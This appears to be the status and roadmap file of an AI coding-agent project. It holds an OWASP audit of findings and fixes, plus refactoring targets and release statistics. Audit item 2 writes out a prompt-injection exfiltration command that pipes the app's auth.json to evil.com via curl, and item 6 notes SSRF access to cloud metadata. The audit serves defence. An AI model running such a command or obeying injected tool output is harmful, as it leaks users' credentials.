| 2 | A04/A02 | **`auth.json` exfiltration via bash tool.** Malicious tool output can instruct agent `cat ~/.local/share/librecode/auth.json \| curl -X POST evil.com`. Add hard-coded read-block on credential paths in `bash`, `read`, `webfetch`; store tokens in OS keychain (`@napi-rs/keyring` or Tauri stronghold) | `packages/librecode/src/auth/service.ts:34`; `packages/librecode/src/tool/bash.ts`; `packages/librecode/src/file/protected.ts` | Medium | TODO |
| 3 | A08 | **SHA256SUMS doesn't cover desktop installers** (.deb/.rpm/.exe/.dmg/.flatpak). One-line workflow fix | `.github/workflows/release.yml:150` | Tiny | TODO |
| 4 | A05 | **Production Tauri CSP is `null`.** Prod config inherits base's `"csp": null`. Combined with `withGlobalTauri: true` + broad `http:default`/`opener` grants, any UI XSS = full host takeover. Set real CSP, narrow grants, set `withGlobalTauri: false` | `packages/desktop/src-tauri/tauri.prod.conf.json` (no `app.security.csp`); `capabilities/default.json` | Medium | TODO |
| 5 | A06 | **`bun audit`: 16 high-severity advisories.** `hono 4.10.7` → `^4.11.4` (arbitrary file access GHSA-q5qw-h33p-qvwr), `@modelcontextprotocol/sdk ≤1.25.3` (cross-client data leak), `minimatch` ReDoS, `seroval` RCE, `vite 7.1.4` dev fs-deny bypass, `dompurify 3.3.1` XSS. Bump the catalog | `package.json` catalog block | Small | TODO |
| 6 | A10 | **`webfetch` has no SSRF protection.** Gated only by `ctx.ask`, but user may click-through. LLM can hit `169.254.169.254` (cloud metadata), internal services. Reuse `BLOCKED_HOST_PATTERNS` from `provider/scan`; resolve DNS once + check IP (prevent rebinding) | `packages/librecode/src/tool/webfetch.ts:22-30` | Small | TODO |
| 7 | A06 | **`cargo audit` not in CI.** Rust/Tauri dep graph unchecked. Add to `scripts/dev-setup.sh --deps` + wire into `ci.yml` | `ci.yml`, `scripts/dev-setup.sh` | Tiny | TODO |

### Medium-severity (should-fix before 1.0.0-preview.1)

| # | OWASP | Issue | Location | Effort | Status |
|---|-------|-------|----------|--------|--------|
| 8 | A01 | Rename unsafe lexical `Filesystem.contains()` → `containsLexical`; default callers to symlink-safe `containsSafe`. Add lint rule | `packages/librecode/src/util/filesystem.ts:150-152` | Small | TODO |
| 9 | A02 | Log redaction layer: strip keys matching `/token\|secret\|key\|authorization\|access\|refresh/i` before write | `packages/librecode/src/util/log.ts:109-121` | Small | TODO |
| 10 | A05 | CORS: require exact port match with known local ports, not `http://localhost:*` wildcard | `packages/librecode/src/server/server.ts:72-81` | Tiny | TODO |
| 11 | A05 | Error handler: `err.message` only in prod; stack trace behind `--dev` | `packages/librecode/src/server/server.ts:68-69` | Tiny | TODO |
| 12 | A07 | Basic-auth rate-limit (token bucket by IP) + 401 logging for brute-force visibility | `packages/librecode/src/server/server.ts:94-102` | Small | TODO |
| 13 | A04 | `/log` endpoint is unauthenticated; LAN peer in mdns mode can pollute audit stream. Gate behind basic-auth | `packages/librecode/src/server/server.ts:104, 191, 359-409` | Tiny | TODO |
| 14 | A08 | Generate CycloneDX SBOMs at release time (`@cyclonedx/cyclonedx-npm` for CLI, `cargo cyclonedx` for Tauri); upload with release | `.github/workflows/release.yml` | Small | TODO |

Strengths already in place (keep these): `Instance.containsPath` symlink-safe, `/provider/scan` SSRF patched, MCP iframe null-origin sandbox + CSP, OAuth state CSRF via `crypto.getRandomValues(32)`, npm OIDC + sigstore provenance, permission audit log, Drizzle-only SQL.

---

## 📋 Best-Practices Audit (snapshot 2026-04-18)

| Check | Target | Actual | Status |
|---|---|---|---|
| Tests pass | all green | 1,616 pass, 9 skip, 0 fail | ✅ |
| Typecheck | 0 errors | 0 errors | ✅ |
| Lint warnings | 0 net-new | 38 (mostly `any` in TUI legacy; no new code) | ⚠️ |
| Files over 1000 lines | 0 | **6** (must split) | ❌ |
| `export namespace` usages | 0 in new code | 6 remain (ACP, Provider, MessageV2, Session, ServerConnection, Identifier) | ⚠️ |
| Complexity > 12 | 0 | 0 | ✅ |

### Files over 1000 lines (violates CLAUDE.md)

| File | Lines | Split strategy |
|------|-------|----------------|
| `packages/librecode/src/provider/sdk/copilot/responses/openai-responses-language-model.ts` | 1,778 | Split by capability: tool-call/streaming/non-streaming |
| `packages/ui/src/components/file-icons/types.ts` | 1,095 | Codegen — exclude from size rule or generate from a TOML |
| `packages/librecode/src/mcp/index.ts` | 1,082 | Extract OAuth flow + built-in-apps merge into submodules |
| `packages/app/src/components/prompt-input.tsx` | 1,037 | Extract voice input, file attachments, suggestion list |
| `packages/app/src/pages/session.tsx` | 1,010 | Extract side-panel orchestration, header assembly |
| `packages/app/src/pages/layout.tsx` | 1,007 | Extract nav, command palette, settings modal wiring |

### Remaining namespace migrations (Playbook 1 in CLAUDE.md)

Apply barrel-export pattern, one PR each (per Playbook 1 rules):

1. `packages/librecode/src/acp/agent.ts:715` — `export namespace ACP`
2. `packages/librecode/src/provider/provider.ts:544` — `export namespace Provider` (partial migration already)
3. `packages/librecode/src/session/message-v2.ts:819` — `export namespace MessageV2`
4. `packages/librecode/src/session/index.ts:910` — `export namespace Session`
5. `packages/app/src/context/server.tsx:36` — `export namespace ServerConnection`
6. `packages/app/src/utils/id.ts:17` — `export namespace Identifier`

---

## 📦 Deferred Items (from earlier phases, still valid)

| Item | Source | Priority | Status |
|------|--------|----------|--------|
| Flathub submission (public listing; manifest already builds in CI) | Phase 22 | Low | Deferred |
| AppImage end-to-end verification (`APPIMAGE_EXTRACT_AND_RUN=1` wired but not validated on fresh system) | Phase 22 | Low | Deferred |
| Desktop locale parity: human-review `th.ts`/`tr.ts` translations | Phase 22 | Low | Deferred |
| Design-debt TODOs in `session/prompt-builder.ts:374, 503` | Phase 22 | Low | Deferred |
| Design-debt TODOs in `plugin/copilot.ts:192-193` | Phase 22 | Low | Deferred |
| Coverage gap in `processor.ts`, `prompt.ts`, `prompt-builder.ts`, `compaction.ts` (<20% each; needs BDD/E2E with running agent, not unit tests) | Phase 20 | Medium | Deferred |
| Update Homebrew formula sha256s to match `v0.9.8` `SHA256SUMS` (currently points at v1.0.0-preview.1) | Phase 22 | Small | TODO |

---

## 🗺️ Net-New Roadmap (post-hardening, pre-1.0)

No GitHub issues currently open. These are candidate workstreams we've discussed; pick based on user priority.

### Phase 29: MCP Co-editing App (deferred from Phase 28 per ADR-005)

CRDT/OT implementation for collaborative real-time editing of shared documents in MCP apps. Design-only as ADR-005 today. Large effort.

### Phase 30: BDD/E2E Coverage Push

Close the coverage gap on `processor.ts`, `prompt.ts`, `prompt-builder.ts`, `compaction.ts` — the files that drive the actual agent loop. Requires a running agent + mock LLM; covered partially by `tests/features/*.feature` + Python pytest-bdd scaffolding already in place. Medium effort.

### Phase 31: Windows Code-Signing + Store Submission

Sign the `.exe` installer with an EV certificate, submit to Microsoft Store (or partner channels) to avoid SmartScreen warnings. Medium effort + cert-procurement cost.

### Phase 32: Linux AppImage Auto-Update

The Tauri updater currently disabled on Linux. Once AppImage is validated (deferred item above), wire up zsync-based delta updates via the AppImage updater framework. Small effort.

### Phase 33: Plugin Marketplace

Extend the 3rd-party providers pattern to arbitrary plugins/tools/MCP servers — searchable registry, publish CLI, one-click install from desktop UI. Large effort.

### Phase 34: Enterprise Features (post-1.0)

Deferred per local-first charter but listed for completeness: SSO/SAML, audit-log forwarding to SIEM, multi-tenant config, secrets management integration. Out-of-scope for 0.9.x / 1.0 stable.

---

## Project Stats

| Metric                       | Value                                                                                                      |
| ---------------------------- | ---------------------------------------------------------------------------------------------------------- |
| Total commits                | ~220                                                                                                       |
| Tests passing                | 1,616                                                                                                      |
| Tests failing                | 0                                                                                                          |
| Tests skipped                | 9                                                                                                          |
| Test files                   | 125                                                                                                        |
| Current version              | **v0.9.8** (staying on 0.9.x until pre-1.0 hardening complete)                                             |
| Complexity violations        | 0                                                                                                          |
| Source files over 1000 lines | 6 (down from target of 0 — tracked for split)                                                              |
| Lint warnings total          | 38 (legacy TUI `any`; down from 1,933)                                                                     |
| Remaining `export namespace` | 6 (down from 4 original; 2 new additions need migration — Playbook 1)                                      |
| OWASP audit posture          | NEEDS WORK — 7 high, 7 medium findings tracked above                                                        |
| ADRs                         | 4 (Effect-ts, Storage, Agent Loop, Auth Prompts) + ADR-005 planned (co-editing)                            |
| npm packages                 | 7 published via OIDC (sdk, plugin, provider-{anthropic,openai,openrouter}, provider-bundle, i18n)          |
| Sister repos                 | librecode-3rdparty-providers, librecode-i18n (both on v0.9.8, OIDC-synced)                                 |
| Core providers               | LiteLLM, Ollama, Amazon Bedrock, Azure                                                                     |
| Release artifacts per tag    | 16 (7 CLI archives, 5 desktop installers, Flatpak, SHA256SUMS, config schema, source zip/tarball)          |
